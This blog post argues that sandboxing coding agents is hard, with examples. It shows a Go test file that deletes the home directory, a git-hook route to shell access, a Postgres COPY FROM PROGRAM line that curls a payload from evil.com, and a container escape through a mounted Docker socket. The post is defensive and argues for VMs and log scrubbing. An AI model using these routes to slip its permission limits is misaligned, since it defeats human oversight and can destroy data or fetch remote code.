---
title: "Why sandboxing coding agents is harder than you think"
url: "https://martinalderson.com/posts/why-sandboxing-coding-agents-is-harder-than-you-think/?utm_source=rss&utm_medium=rss&utm_campaign=feed"
fetched_at: 2026-05-01T07:02:07.032112+00:00
source: "martinalderson.com"
tags: [blog, raw]
---

# Why sandboxing coding agents is harder than you think

Source: https://martinalderson.com/posts/why-sandboxing-coding-agents-is-harder-than-you-think/?utm_source=rss&utm_medium=rss&utm_campaign=feed

While I've been blown away by the development in coding agents, I'm starting to get worried there are some quite serious security risks coming from them.
I'm increasingly of the opinion that we need to reimagine the operating system itself a bit to cope with this - very similar to how iOS and Android in the smartphone arena had a very different permission, multitasking and background service approach to conventional "desktop" OSes.
Permission systems are too naïve
A common pattern for restricting coding agents is to allow them to only execute certain commands automatically. For example, you may allow it to do a
git add
and
git commit
automatically, but restrict
git push
or
git merge
operations.
While this makes a lot of sense (and it is a pattern I use a lot), I think there is a serious problem in that somewhat "innocuous" commands like
dotnet test
or
go test
can end up doing much more than that.
Imagine a coding agent has the task of fixing a bug. It finds out that disk space is low, so it (wrongly!) decides the best course of action is to clear the users home directory to make space. Now, you have sensibly restricted the coding agent to a very minimal set of commands - perhaps read/write (in the project folder) and
go build
and
go test
.
The difficulty is if it wanted to, it could simply create a new go test file:
package main

import (
	"os"
	"testing"
)

func TestCleanup(t *testing.T) {
	homeDir, _ := os.UserHomeDir()
	os.RemoveAll(homeDir)
}
that does the exact same as
rm -rf ~
. It can now execute this simply by running
go test
.
Equally, even
git
itself can execute arbitrary code via commit hooks. So it could just write to
.git/hooks/pre-commit
and then do the whitelisted
git commit
command - to give it full shell access.
These are just examples. I imagine nearly every development tool you use day to day has similar "permission escalation" vectors.
As such I think really
any
automatic tool execution in a non-sandboxed (e.g. Docker) environment is a big security risk. As models get better and better I think we'll start using these 'bypasses' more and more - not because they are being overtly malicious - but because they just want to get the job done!
But, Docker has issues too
I'm still worried that Dockerising the coding agent still has significant risks. Imagine you lock down your Docker container well, and restrict network access. However, you do give it access to your (firewalled) Postgres staging database instance so it can investigate issues/run tests, etc.
All good right? Unfortunately not - it now has arbitrary code and network execution via COPY PROGRAM if you have given it superuser permissions by accident on the database server (I see this quite a lot - often the 'staging' user has
way
more permissions than it should - it's just staging after all!)
CREATE TABLE temp_payload (line text);
COPY temp_payload FROM PROGRAM 'curl -s http://evil.com/payload.sh'; SELECT * FROM temp_payload;
Again, this is just an example off the top of my head - with a clever enough model, I'm sure they can figure out weird and wonderful ways to 'exploit' this functionality in any server you give it access to.
Then there is also the problem of Docker itself. Often to run Docker-in-Docker, for example with TestContainers for tests, you spawn the Claude Code instance with
docker run -v /var/run/docker.sock:/var/run/docker.sock
The problem here is that socket effectively gives it elevated permissions on the host. If it wants, it can just spawn another container through that socket with full filesystem/network access.
My recommendation on this is to instead use 'throwaway' VMs
instead
of Docker if you are concerned about security. This allows the agent to use Docker itself securely in the container without any worries.
There's various micro VM options, but for local development I'd recommend just using
libvirt
with KVM. If you want faster startup, use
virsh save
and
virsh resume
to save a snapshot to an image at boot and then use that as the basis for each VM you want to spin up. On a fast machine with decent NVMes this takes seconds - it's not obviously slower than Docker in my experience, but with a far better security boundary if you need the agent to use Docker. This, however, does not rule out privilege escalation via a remote host it has access to.
Secrets in log files
Even a perfectly sandboxed agent creates a new problem: its logs. While the example above is really about protecting against "accidental" over eagerness from agents vs outright bad actors, I do have serious concerns about the log files that agents like Claude Code generate
and
most likely store on their end for audit and diagnostic purposes (even if not for training!).
It occurred to me recently while I was building a bunch of
CLIs
that I was pasting secrets in by accident more times than I'd like to admit. It's very easy to just copy and paste setup instructions and accidentally include a secret in it.
This got me thinking - even being very careful, it's hard to avoid this completely. For example, a program crashes and in the stack trace accidentally leaks env variables. Or the agent... just reading your $ENV vars to diagnose a problem. Plus enabling trace logs often reveal secrets that you probably don't want to expose.
These all end up in Claude Code's log directory and (I assume) in Anthropic's servers.
As such I think these log files are becoming extremely high value targets - why bother doing complex attacks to grab secrets when you can just grab these log files and figure out the secrets from there.
What would be great would be some auto-secret scrubbing from the log files (detecting common patterns and redacting them at a minimum), plus encrypting the local log files. Interestingly, Claude Code tells me off when I accidentally put a secret in the chat, but it doesn't tell itself off when it reads one by accident.
Vulnerability hunting at industrial scale
This is probably the one that concerns me the most. I found out a while ago it was
trivial
for LLMs to find exploits in "niche" open source projects I use. I didn't go too deep in this but it was very easy for it to find a DoS attack vector with virtually no effort or even rudimentary knowledge of the codebase from my part.
Combined with their excellent skills in reverse engineering code, this is a true systemic risk that needs serious attention.
I suspect bad actors already are using agents to find hundreds (thousands or more?) of vulnerabilities in open (and closed) source servers. The real risk imo isn't really from popular servers like sshd or nginx, but the huge long tail of weird and wonderful servers and applications.
A lot of these (unlike say nginx) have very little attention on them. This in the past did mean that it was nearly pointless for bad actors to find vulnerabilities in them - why spend effort on a small project that maybe has a few hundred servers total when you can focus on higher value targets.
There was a
very interesting study
done showing that in some examples, agents were outcompeting humans in many pentesting tasks. This is a side effect of making models great at coding - they also become great at finding security weaknesses.
Now I can definitely see a world where this long tail with agents becomes much more attractive. 100 exploits in 100 small apps = 10,000 targets.
Equally agentic tools are going to be great at
fixing
these issues, but there's definitely going to be a lag between this proliferation of attacks and these tools being patched (if they even have a maintainer).
The asymmetry has flipped. Finding vulnerabilities used to be expensive and exploiting them was cheap. Now both are cheap.
Fundamentally agents are a new 'category' of software execution that I don't think maps well to most OS models. We tend to think of code as either malicious or trusted. Agents are neither. That's the problem.
